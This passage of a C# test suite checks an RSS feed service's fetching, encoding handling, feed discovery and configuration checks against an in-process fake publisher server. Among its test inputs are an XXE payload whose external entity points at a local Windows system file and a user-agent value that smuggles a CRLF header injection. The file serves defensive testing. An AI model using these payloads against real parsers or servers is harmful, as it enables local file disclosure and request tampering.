            ["/unclosed"] = """<rss version="2.0"><channel><title>Broken</channel></rss>""",
            ["/not-xml"] = "{\"version\":\"https://jsonfeed.org/version/1.1\",\"items\":[]}",
            ["/empty"] = "",
            ["/html"] = "<html><head><title>Not a feed</title></head><body><p>Hello</p></body></html>",
            ["/other-xml"] = """<?xml version="1.0"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>https://a.test/</loc></url></urlset>""",
            ["/rss-no-channel"] = """<rss version="2.0"><item><title>Orphan</title></item></rss>""",
        };
        foreach (var (path, body) in served) publisher.Serve("feeds.xml.test", path, context => context.Send(body, "application/rss+xml"));
        publisher.Serve("feeds.xml.test", "/utf16-doctype", context => context.SendBytes(
            Encoding.Unicode.GetPreamble().Concat(Encoding.Unicode.GetBytes("<?xml version=\"1.0\" encoding=\"utf-16\"?><!DOCTYPE rss [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><rss><channel><title>&x;</title></channel></rss>")).ToArray(),
            "application/xml"));
        publisher.Resolve("collector.xml.test", RssFixture.PublicAddress.ToString());
        await using var host = publisher.Compose();
        publisher.Connections.Clear();

        foreach (var (path, code) in new[]
        {
            ("/xxe-file", FeedErrorCode.ProhibitedXml), ("/xxe-http", FeedErrorCode.ProhibitedXml), ("/external-dtd", FeedErrorCode.ProhibitedXml),
            ("/parameter-entity", FeedErrorCode.ProhibitedXml), ("/laughs", FeedErrorCode.ProhibitedXml), ("/legacy-doctype", FeedErrorCode.ProhibitedXml),
            ("/utf16-doctype", FeedErrorCode.ProhibitedXml),
            ("/undeclared-entity", FeedErrorCode.MalformedXml), ("/unclosed", FeedErrorCode.MalformedXml), ("/not-xml", FeedErrorCode.MalformedXml),
            ("/empty", FeedErrorCode.MalformedXml),
            ("/html", FeedErrorCode.NotAFeed), ("/other-xml", FeedErrorCode.NotAFeed), ("/rss-no-channel", FeedErrorCode.NotAFeed),
        })
        {
            var result = await host.Rss.FetchAsync(new("http://feeds.xml.test" + path, new("\"held\"")));
            Assert.Equal((path, FeedFetchStatus.Failed, code, null), (path, result.Status, result.Error!.Code, result.Feed));
            // The caller keeps the validators it had: the new ones describe a document nobody could read.
            Assert.Equal(new FeedValidatorsDto("\"held\""), result.Validators);
            Assert.DoesNotContain("passwd", result.Error.Message);
        }

        // Nothing the documents pointed at was resolved or connected to.
        Assert.DoesNotContain("collector.xml.test", publisher.Lookups);
        Assert.Empty(publisher.Received("collector.xml.test"));
        Assert.All(publisher.Connections, endpoint => Assert.Equal(RssFixture.PublicAddress, endpoint.Address));
    }

    [Fact]
    public async Task Encodings_AreTakenFromTheDocumentThenTheTransport()
    {
        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        var windows = Encoding.GetEncoding(1252);
        publisher.Serve("feeds.text.test", "/declared", context => context.SendBytes(
            windows.GetBytes("<?xml version=\"1.0\" encoding=\"windows-1252\"?><rss version=\"2.0\"><channel><title>Café “Señor” – €5</title></channel></rss>"),
            "text/xml; charset=utf-8"));
        publisher.Serve("feeds.text.test", "/transport", context => context.SendBytes(
            Encoding.Latin1.GetBytes("<rss version=\"2.0\"><channel><title>Crème brûlée</title></channel></rss>"),
            "text/xml; charset=\"ISO-8859-1\""));
        publisher.Serve("feeds.text.test", "/marked", context => context.SendBytes(
            Encoding.Unicode.GetPreamble().Concat(Encoding.Unicode.GetBytes("<rss version=\"2.0\"><channel><title>日本語 ✓</title></channel></rss>")).ToArray(),
            "text/xml; charset=iso-8859-1"));
        publisher.Serve("feeds.text.test", "/unknown-charset", context => context.SendBytes(
            Encoding.UTF8.GetBytes("<rss version=\"2.0\"><channel><title>Žluťoučký</title></channel></rss>"), "text/xml; charset=x-made-up"));
        publisher.Serve("www.text.test", "/", context => context.SendBytes(
            windows.GetBytes("<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"><title>Café – Menü</title></head></html>"),
            "text/html"));
        await using var host = publisher.Compose();

        Assert.Equal("Café “Señor” – €5", (await host.Rss.FetchAsync(new("http://feeds.text.test/declared"))).Feed!.Title);
        Assert.Equal("Crème brûlée", (await host.Rss.FetchAsync(new("http://feeds.text.test/transport"))).Feed!.Title);
        Assert.Equal("日本語 ✓", (await host.Rss.FetchAsync(new("http://feeds.text.test/marked"))).Feed!.Title);
        Assert.Equal("Žluťoučký", (await host.Rss.FetchAsync(new("http://feeds.text.test/unknown-charset"))).Feed!.Title);
        Assert.Equal("Café – Menü", (await host.Rss.DiscoverAsync(new("http://www.text.test/"))).Publisher!.Name);
    }

    [Fact]
    public async Task Discovery_ReadsOnlyWhatAPageAdvertisesInItsHead()
    {
        publisher.Serve("www.fabrikam.test", "/", context => context.Redirect(301, "/home"));
        publisher.Serve("www.fabrikam.test", "/home", context => context.Send(Page, "text/html; charset=utf-8"));
        publisher.Serve("www.fabrikam.test", "/plain", context => context.Send(
            "<html><head><title>Nothing to subscribe to</title><link rel=\"apple-touch-icon\" href=\"/touch.png\"></head><body></body></html>", "text/html"));
        publisher.Serve("www.fabrikam.test", "/long", context => context.Send(
            "<html><head><link rel=alternate type=application/atom+xml href=/early.xml></head><body>" + new string('a', 3 * 1024 * 1024)
            + "<link rel=alternate type=application/rss+xml href=/late.xml></body></html>", "text/html"));
        publisher.Serve("www.fabrikam.test", "/xhtml", context => context.Send(
            "<?xml version=\"1.0\"?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">"
            + "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>XHTML</title><link rel=\"alternate\" type=\"application/rss+xml\" href=\"/x.xml\"/></head></html>",
            "application/xhtml+xml"));
        publisher.Serve("www.fabrikam.test", "/feed.xml", context => context.Send(Rss, "text/xml"));
        publisher.Serve("www.fabrikam.test", "/broken.xml", context => context.Send("<rss><channel>", "application/rss+xml"));
        publisher.Serve("www.fabrikam.test", "/missing", context => context.Status(404));
        await using var host = publisher.Compose();

        var found = await host.Rss.DiscoverAsync(new("http://www.fabrikam.test/"));

        Assert.Equal((FeedDiscoveryStatus.Found, "http://www.fabrikam.test/home", null), (found.Status, found.FinalUrl, found.Error));
        Assert.Equal(new PublisherDto("http://www.fabrikam.test/", "Fabrikam & Sons", "Hand-made furniture", "http://www.fabrikam.test/favicon.ico", "en-GB"), found.Publisher);
        // Resolved against the base element; nothing from a comment, a script, the body, or a non-web address.
        Assert.Equal(
        [
            new DiscoveredFeedDto("http://www.fabrikam.test/blog/feed.xml", FeedFormat.Rss, "All posts"),
            new DiscoveredFeedDto("http://www.fabrikam.test/atom.xml", FeedFormat.Atom, null),
            new DiscoveredFeedDto("http://feeds.fabrikam.test/news.xml", FeedFormat.Rss, null),
        ], found.Feeds);

        // A page with no feed is an answer, not a failure, and still says who published it.
        var none = await host.Rss.DiscoverAsync(new("http://www.fabrikam.test/plain"));
        Assert.Equal((FeedDiscoveryStatus.NoneFound, 0, null), (none.Status, none.Feeds.Count, none.Error));
        Assert.Equal(("Nothing to subscribe to", "http://www.fabrikam.test/touch.png"), (none.Publisher!.Name, none.Publisher.IconUrl));

        // A page far over the limit is cut, not refused: its head is all that is read.
        Assert.Equal(["http://www.fabrikam.test/early.xml"], (await host.Rss.DiscoverAsync(new("http://www.fabrikam.test/long"))).Feeds.Select(feed => feed.Url));
        Assert.Equal(["http://www.fabrikam.test/x.xml"], (await host.Rss.DiscoverAsync(new("http://www.fabrikam.test/xhtml"))).Feeds.Select(feed => feed.Url));

        // An address that is itself a feed is its own single feed.
        var self = await host.Rss.DiscoverAsync(new("http://www.fabrikam.test/feed.xml"));
        Assert.Equal([new DiscoveredFeedDto("http://www.fabrikam.test/feed.xml", FeedFormat.Rss, "Northwind & Co News")], self.Feeds);
        Assert.Equal(new PublisherDto("https://www.northwind.test/news/", "Northwind & Co News", "Company updates", "https://www.northwind.test/logo.png", "en-ZA"), self.Publisher);

        Assert.Equal((FeedDiscoveryStatus.Failed, FeedErrorCode.MalformedXml), ((await host.Rss.DiscoverAsync(new("http://www.fabrikam.test/broken.xml"))) is var broken ? (broken.Status, broken.Error!.Code) : default));
        var missing = await host.Rss.DiscoverAsync(new("http://www.fabrikam.test/missing"));
        Assert.Equal((FeedDiscoveryStatus.Failed, FeedErrorCode.HttpStatus, 404, 0), (missing.Status, missing.Error!.Code, missing.Error.HttpStatus, missing.Feeds.Count));
        // Discovery fetches the one page it was given. It never goes on to fetch what the page links to.
        Assert.DoesNotContain(publisher.Received("www.fabrikam.test"), request => request.Path is "/atom.xml" or "/blog/feed.xml");
        Assert.Empty(publisher.Received("feeds.fabrikam.test"));
    }

    [Fact]
    public void Registration_RefusesAMissingLimit_AndExposesNothingOverHttp()
    {
        foreach (var (key, value) in new[]
        {
            ("Rss:MaxFeedBytes", "0"), ("Rss:TimeoutSeconds", "0"), ("Rss:MaxRedirects", "50"), ("Rss:UserAgent", " "),
            ("Rss:UserAgent", "a\r\nX-Injected: 1"), ("Rss:AllowedPorts:0", "70000"), ("Rss:MaxItems", "0"),
        })
        {
            Assert.Throws<InvalidOperationException>(() => publisher.Compose((key, value)));
        }

        // An injectable service only: no controller, endpoint or hosted worker ships in the package.
        Assert.DoesNotContain(typeof(RssService).Assembly.GetTypes(), type =>
            typeof(Microsoft.AspNetCore.Mvc.ControllerBase).IsAssignableFrom(type) || typeof(Microsoft.Extensions.Hosting.IHostedService).IsAssignableFrom(type));
        Assert.DoesNotContain(typeof(RssService).Assembly.GetReferencedAssemblies(), reference => reference.Name!.StartsWith("Microsoft.AspNetCore", StringComparison.Ordinal));
    }
}

/// <summary>What the in-process publisher saw of one request.</summary>
public sealed record ReceivedRequest(string Host, string Path, string UserAgent, string AcceptEncoding, string Cookie, string? IfNoneMatch, string? IfModifiedSince);

/// <summary>The RSS service composed over the fixture's network.</summary>
public sealed class RssHost(ServiceProvider services) : IAsyncDisposable
{
    public IRssService Rss { get; } = services.GetRequiredService<IRssService>();

    public ValueTask DisposeAsync() => services.DisposeAsync();
}

/// <summary>
/// A web server on this machine that plays every publisher, and the <see cref="IRssNetwork"/> that
/// lets the fetcher reach it while still believing it is on the public internet.
/// </summary>
public sealed class RssFixture : IAsyncLifetime, IRssNetwork
{
    /// <summary>A routable address every test publisher "lives" at. Nothing is ever really sent to it.</summary>
    public static readonly IPAddress PublicAddress = IPAddress.Parse("93.184.216.34");

    private readonly ConcurrentDictionary<string, Func<HttpContext, Task>> routes = new(StringComparer.OrdinalIgnoreCase);
    private readonly ConcurrentDictionary<string, Func<IPAddress[]>> names = new(StringComparer.OrdinalIgnoreCase);
    private readonly ConcurrentQueue<ReceivedRequest> received = new();
    private WebApplication? server;
    private int port;

    /// <summary>Every address the fetcher asked to connect to, in order.</summary>
    public ConcurrentQueue<IPEndPoint> Connections { get; } = new();

    /// <summary>Every name the fetcher asked to resolve, in order.</summary>
    public ConcurrentQueue<string> Lookups { get; } = new();

    public async Task InitializeAsync()
    {
        var builder = WebApplication.CreateSlimBuilder();
        builder.Logging.ClearProviders();
        builder.WebHost.UseKestrel(kestrel => kestrel.Listen(IPAddress.Loopback, 0));
        server = builder.Build();
        server.Run(async context =>
        {
            var host = context.Request.Host.Host;
            received.Enqueue(new ReceivedRequest(
                host,
                context.Request.Path,
                context.Request.Headers.UserAgent.ToString(),
                context.Request.Headers.AcceptEncoding.ToString(),
                context.Request.Headers.Cookie.ToString(),
                context.Request.Headers.IfNoneMatch.Count == 0 ? null : context.Request.Headers.IfNoneMatch.ToString(),
                context.Request.Headers.IfModifiedSince.Count == 0 ? null : context.Request.Headers.IfModifiedSince.ToString()));

            if (routes.TryGetValue(host + context.Request.Path, out var respond))
            {
                await respond(context);
            }
            else
            {
                context.Response.StatusCode = 404;
            }
        });
        await server.StartAsync();
        port = new Uri(server.Services.GetRequiredService<IServer>().Features.Get<IServerAddressesFeature>()!.Addresses.Single()).Port;
    }

    /// <summary>Publishes a document, and makes the host name resolve to the public test address.</summary>
    public void Serve(string host, string path, Func<HttpContext, Task> respond)
    {
        routes[host + path] = respond;
        names.TryAdd(host, () => [PublicAddress]);
    }

    public void Resolve(string host, params string[] addresses) => names[host] = () => addresses.Select(IPAddress.Parse).ToArray();

    public void Resolve(string host, Func<IPAddress[]> answer) => names[host] = answer;

    public IReadOnlyList<ReceivedRequest> Received(string host) => received.Where(request => request.Host.Equals(host, StringComparison.OrdinalIgnoreCase)).ToArray();

    /// <summary>Registers the service the way a host does, then swaps in this network.</summary>
    public RssHost Compose(params (string Key, string Value)[] settings)
    {
        var services = new ServiceCollection();
        services.AddLogging();
        services.AddRss(new ConfigurationBuilder().AddInMemoryCollection(settings.ToDictionary(pair => pair.Key, pair => (string?)pair.Value)).Build());
        services.AddSingleton<IRssNetwork>(this);
        return new RssHost(services.BuildServiceProvider(new ServiceProviderOptions { ValidateOnBuild = true }));
    }

    Task<IPAddress[]> IRssNetwork.ResolveAsync(string host, CancellationToken cancellationToken)
    {
        Lookups.Enqueue(host);
        return Task.FromResult(names.TryGetValue(host, out var answer) ? answer() : []);
    }

    async Task<Stream> IRssNetwork.ConnectAsync(IPEndPoint endpoint, CancellationToken cancellationToken)
    {
        Connections.Enqueue(endpoint);

        // The one substitution: an address the fetcher approved is served from this machine.
        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) { NoDelay = true };
        await socket.ConnectAsync(new IPEndPoint(IPAddress.Loopback, port), cancellationToken);
        return new NetworkStream(socket, ownsSocket: true);
    }

    public async Task DisposeAsync()
    {
        if (server is not null) await server.DisposeAsync();
    }

    public static byte[] Gzip(string text) => Compress(text, stream => new GZipStream(stream, CompressionLevel.Optimal, leaveOpen: true));
    public static byte[] Brotli(string text) => Compress(text, stream => new BrotliStream(stream, CompressionLevel.Optimal, leaveOpen: true));
    public static byte[] Zlib(string text) => Compress(text, stream => new ZLibStream(stream, CompressionLevel.Optimal, leaveOpen: true));
    public static byte[] Deflate(string text) => Compress(text, stream => new DeflateStream(stream, CompressionLevel.Optimal, leaveOpen: true));

    private static byte[] Compress(string text, Func<Stream, Stream> wrap)
    {
        var output = new MemoryStream();
        using (var compressor = wrap(output)) compressor.Write(Encoding.UTF8.GetBytes(text));
        return output.ToArray();
    }
}

internal static class PublisherResponses
{
    public static Task Send(this HttpContext context, string body, string contentType) => context.SendBytes(Encoding.UTF8.GetBytes(body), contentType);

    public static Task SendBytes(this HttpContext context, byte[] body, string contentType)
    {
        context.Response.ContentType = contentType;
        context.Response.ContentLength = body.Length;
        return context.Response.Body.WriteAsync(body).AsTask();
    }

    public static Task SendEncoded(this HttpContext context, byte[] body, string encoding)
    {
        context.Response.Headers.ContentEncoding = encoding;
        return context.SendBytes(body, "application/rss+xml");
    }

    public static Task Redirect(this HttpContext context, int status, string location)
    {
        context.Response.StatusCode = status;
        context.Response.Headers.Location = location;
        return Task.CompletedTask;
    }

    public static Task Status(this HttpContext context, int status)
    {
        context.Response.StatusCode = status;
        return Task.CompletedTask;
    }
}
